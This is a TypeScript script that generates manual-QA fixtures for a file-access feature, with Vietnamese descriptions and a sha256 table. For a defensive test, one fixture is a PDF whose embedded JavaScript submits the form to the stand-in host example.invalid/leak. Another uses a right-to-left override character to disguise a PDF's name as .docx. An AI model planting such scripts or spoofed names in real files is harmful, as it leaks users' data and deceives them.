// Synthetic fixtures for docs/manual-qa-file-access.md, with a sha256 table for the evidence sheet.
//   node scripts/qa-fixtures.mts [--large] [--extra <dir>]
// Output: .qa-tmp/file-access/ (gitignored). Never point --extra at customer files.
import crypto from 'node:crypto'
import fs from 'node:fs'
import path from 'node:path'
import { ACCEPTED_EXTENSIONS, extensionOf } from '../src/lib/files/intake-contract.ts'
import { REPO_ROOT, workspaceRoot } from '../src/lib/build/workspace.ts'

const args = process.argv.slice(2)
const large = args.includes('--large')
const extraAt = args.indexOf('--extra')
const extraDir = extraAt >= 0 ? path.resolve(args[extraAt + 1] ?? '') : null
const out = path.join(REPO_ROOT, '.qa-tmp', 'file-access')

function findWorkspace(): string {
  const candidates = [workspaceRoot(), path.resolve(REPO_ROOT, '../..')]
  const found = candidates.find((dir) => fs.existsSync(path.join(dir, 'pdfcraft')) && fs.existsSync(path.join(dir, 'wordcraft')))
  if (!found) throw new Error('fork checkouts not found; set ERPCONS_WORKSPACE to the folder holding wordcraft/ and pdfcraft/')
  return found
}
const workspace = findWorkspace()

// Fork test corpora only (read, never modified). The forks build Office test files in code, so none exist on disk.
const CORPUS: Record<string, string> = {
  'pdf/form.pdf': 'pdfcraft/crates/ui-egui/tests/data/form.pdf',
  'pdf/da-ky.pdf': 'pdfcraft/crates/sign/tests/data/openssl-signed.pdf',
  'csv/showcase-data.csv': 'pdfcraft/assets/demo/showcase-data.csv',
  'tsv/vi.tsv': 'wordcraft/crates/ui-egui/src/i18n/vi.tsv',
  'txt/README.txt': 'gridcraft/crates/mdb/tests/fixtures/README.txt',
  'md/ATTRIBUTION.md': 'wordcraft/ATTRIBUTION.md',
}
const PURPOSE: Record<string, string> = {
  'pdf/form.pdf': 'TC04/TC06/TC13: định dạng PDF',
  'pdf/da-ky.pdf': 'TC18: PDF đã ký',
  'csv/showcase-data.csv': 'Định dạng CSV',
  'tsv/vi.tsv': 'Định dạng TSV',
  'txt/README.txt': 'Định dạng TXT',
  'md/ATTRIBUTION.md': 'Định dạng MD',
}

// One object per entry; offsets are computed so the xref table is exact and the file opens without repair.
function pdf(objects: string[]): Buffer {
  let body = '%PDF-1.7\n%\xe2\xe3\xcf\xd3\n'
  const offsets: number[] = []
  objects.forEach((object, i) => {
    offsets.push(Buffer.byteLength(body, 'latin1'))
    body += `${i + 1} 0 obj\n${object}\nendobj\n`
  })
  const xref = Buffer.byteLength(body, 'latin1')
  body += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n`
  body += offsets.map((offset) => `${String(offset).padStart(10, '0')} 00000 n \n`).join('')
  body += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`
  return Buffer.from(body, 'latin1')
}
const stream = (content: string) => `<< /Length ${Buffer.byteLength(content, 'latin1')} >>\nstream\n${content}\nendstream`
const textPage = (text: string) => stream(`BT /F1 24 Tf 72 720 Td (${text}) Tj ET`)
const page = (extra = '') => `<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >>${extra} >>`
const font = '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>'

// Document JavaScript (OpenAction + Names tree) and an XFA packet with a script; none of it may run (TC17).
const scripted = pdf([
  '<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R /Names << /JavaScript << /Names [(qa) 6 0 R] >> >> /AcroForm << /Fields [] /XFA 7 0 R >> >>',
  '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
  page(' /AA << /O 6 0 R >>'),
  textPage('QA TC17: scripts must not run'),
  font,
  "<< /S /JavaScript /JS (app.alert\\('TC17: JavaScript ran'\\); this.submitForm\\('https://example.invalid/leak'\\);) >>",
  stream('<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template xmlns="http://www.xfa.org/schema/xfa-template/3.3/"><subform name="f"><event activity="initialize"><script contentType="application/x-javascript">xfa.host.messageBox("TC17: XFA script ran")</script></event></subform></template></xdp:xdp>'),
])
const simple = (text: string) => pdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', page(), textPage(text), font])

// A ~95 MB valid PDF: one page whose content stream is mostly comment lines the parser must still read (TC22).
function largePdf(): Buffer {
  const line = '% ' + 'x'.repeat(97) + '\n'
  const filler = line.repeat(Math.floor((95 * 1024 * 1024) / line.length))
  return pdf(['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', page(), stream(`${filler}BT /F1 24 Tf 72 720 Td (QA TC22) Tj ET`), font])
}

const generated: [string, () => Buffer, string][] = [
  ['pdf/co-script.pdf', () => scripted, 'TC17: PDF có JavaScript và XFA'],
  ['pdf/hong-cat-cut.pdf', () => fs.readFileSync(path.join(workspace, CORPUS['pdf/form.pdf'])).subarray(0, 700), 'TC09: tệp hỏng (còn chữ ký %PDF, đọc lỗi)'],
  ['pdf/trong.pdf', () => Buffer.alloc(0), 'TC09: tệp rỗng, bị từ chối'],
  ['docx/gia-mao.docx', () => Buffer.from('Không phải tệp Word.\n', 'utf8'), 'TC09/TC17: đuôi .docx nhưng nội dung là chữ, bị từ chối'],
  ['trung-ten/a/Báo cáo tháng 10.pdf', () => simple('Ban A'), 'TC10: cùng tên, nội dung A'],
  ['trung-ten/b/Báo cáo tháng 10.pdf', () => simple('Ban B'), 'TC10: cùng tên, nội dung B'],
  // Shown raw, U+202E makes this read "hoa-donfdp.docx"; the real extension is .pdf, so it is accepted and opens in PDF.
  ['ten-dao-chieu/hoa-don\u202excod.pdf', () => simple('QA TC17 bidi'), 'TC17: tên có ký tự đảo chiều, đuôi thật .pdf: mở trong PDF, tên hiện không bị đảo'],
]
if (large) generated.push(['lon/lon-95mb.pdf', largePdf, 'TC22: tệp khoảng 95 MB'])

fs.rmSync(out, { recursive: true, force: true })
const rows: { file: string; bytes: number; sha256: string; purpose: string }[] = []
const samples = new Set<string>()
function write(rel: string, data: Buffer, purpose: string) {
  const file = path.join(out, rel)
  fs.mkdirSync(path.dirname(file), { recursive: true })
  fs.writeFileSync(file, data)
  rows.push({ file: rel, bytes: data.length, sha256: crypto.createHash('sha256').update(data).digest('hex'), purpose })
}

for (const [rel, source] of Object.entries(CORPUS)) {
  write(rel, fs.readFileSync(path.join(workspace, source)), `${PURPOSE[rel]} (từ ${source})`)
  samples.add(extensionOf(rel))
}
for (const [rel, make, purpose] of generated) write(rel, make(), purpose)

if (extraDir) {
  for (const name of fs.readdirSync(extraDir)) {
    const ext = extensionOf(name)
    if (!ACCEPTED_EXTENSIONS.includes(ext) || !fs.statSync(path.join(extraDir, name)).isFile()) continue
    const data = fs.readFileSync(path.join(extraDir, name))
    write(`them/${name}`, data, `Định dạng ${ext.toUpperCase()} (tệp tổng hợp do người kiểm đưa vào)`)
    samples.add(ext)
    if (ext === 'docx' && !rows.some((row) => row.file === 'docx/hong-cat-cut.docx')) {
      write('docx/hong-cat-cut.docx', data.subarray(0, Math.max(30, Math.floor(data.length / 2))), 'TC09: docx bị cắt cụt')
    }
  }
}

const missing = ACCEPTED_EXTENSIONS.filter((ext) => !samples.has(ext))
const table = [
  '# Fixture kiểm tay: tải tệp, chia sẻ, mở bằng',
  '',
  `Sinh lúc ${new Date().toISOString()} bằng \`node scripts/qa-fixtures.mts${large ? ' --large' : ''}${extraDir ? ' --extra …' : ''}\`. Không commit.`,
  '',
  '| Tệp | Byte | sha256 | Dùng cho |',
  '|---|---:|---|---|',
  ...rows.map((row) => `| \`${row.file.replace(/[\u202a-\u202e\u2066-\u2069]/g, (c) => `<U+${c.charCodeAt(0).toString(16).toUpperCase()}>`)}\` | ${row.bytes} | \`${row.sha256}\` | ${row.purpose} |`),
  '',
  missing.length ? `Chưa có tệp mẫu cho: ${missing.join(', ')}. Corpus của các fork không có sẵn; tạo tệp tổng hợp (ví dụ lưu từ chính Văn phòng hoặc LibreOffice), đặt vào một thư mục rồi chạy lại với \`--extra <thư mục>\`.` : 'Đủ mọi định dạng nhận.',
  '',
]
fs.writeFileSync(path.join(out, 'SHA256SUMS.md'), table.join('\n'))
fs.writeFileSync(path.join(out, 'SHA256SUMS'), rows.map((row) => `${row.sha256}  ${row.file}`).join('\n') + '\n')
console.log(`${rows.length} fixtures in ${out}`)
if (missing.length) console.log(`missing formats: ${missing.join(', ')}`)
